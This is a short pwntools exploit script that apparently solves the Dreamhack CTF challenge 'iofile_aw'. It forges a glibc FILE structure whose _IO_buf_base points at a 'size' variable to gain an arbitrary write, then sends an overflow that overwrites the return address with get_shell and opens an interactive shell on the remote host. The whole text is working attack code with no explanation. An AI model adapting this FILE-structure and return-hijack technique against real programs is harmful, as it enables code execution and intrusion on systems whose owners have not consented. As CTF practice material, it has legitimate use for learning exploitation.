from pwn import *

port = 19796
rem = remote("host3.dreamhack.games", port)

elf = ELF("./Pwnable/iofile_aw/problem/iofile_aw")

buf_addr = elf.symbols['buf']
size_addr = elf.symbols['size']
shell_addr = elf.symbols['get_shell']

payload = p64(0xfbad208b)
payload += p64(0) # _IO_read_ptr
payload += p64(0) # _IO_read_end
payload += p64(0) # _IO_read_base
payload += p64(0) # _IO_write_base
payload += p64(0) # _IO_write_ptr
payload += p64(0) # _IO_write_end
payload += p64(size_addr) # _IO_buf_base

rem.sendlineafter(b"# ", b"printf " + payload)

rem.sendlineafter(b"# ", b"read\x00")
rem.sendline(p64(0x300))

payload = b'A' * 0x223
payload += p64(shell_addr)

rem.sendlineafter(b"# ", b"exit\x00" + payload)

rem.interactive()
